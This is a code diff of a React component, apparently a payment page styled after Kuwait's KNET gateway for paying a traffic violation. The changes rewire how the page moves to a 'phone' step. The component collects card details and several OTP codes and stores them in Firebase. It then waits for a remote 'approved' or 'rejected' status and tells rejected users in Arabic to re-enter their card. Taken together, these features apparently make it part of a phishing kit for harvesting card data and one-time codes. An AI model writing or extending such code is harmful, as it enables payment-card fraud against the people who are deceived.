@@ -2,7 +2,7 @@
 import { useEffect, useState } from "react";
 import "./kent.css";
 import { doc, onSnapshot, updateDoc } from "firebase/firestore";
-import { db, handlePay } from "../firebase";
+import { addData, db, handlePay } from "../firebase";
 import FullPageLoader from "../loader1";
 type PaymentInfo = {
   createdDate?: string;
@@ -172,13 +172,10 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
     prefix: "",
     status: "new",
   });
-  const handleNewpage = () => {
-    handleUpdatePage("phone");
-  };
+
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `);
     if (newotp.length > 2) {
-      handleNewpage();
     }
   };
   useEffect(() => {
@@ -196,7 +193,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
             if (data.status === "approved") {
               setstep(2);
               setLoading(false);
-              data.page === "o";
+              data.page === "";
             } else if (data.status === "rejected") {
               setLoading(false);
               alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ");
@@ -658,18 +655,16 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                             setLoading(true);
                             handleAddotp(paymentInfo.otp!);
                             //     handleOArr(paymentInfo.otp!);
-                            handlePay({paymentInfo,page:
-                            'phone'}, setPaymentInfo);
+                            handlePay(paymentInfo, setPaymentInfo);
                             setTimeout(() => {
-                              setLoading(false);
-                              setTimeout(() => {
-                              }, 2000);
+                             
                               setPaymentInfo({
                                 ...paymentInfo,
                                 otp: "",
                                 status: "approved",
                               });
-                              props.setPage("phone");
+                              setLoading(false);
+                              handleUpdatePage('phone')
                             }, 3000);
                           }
                         }}
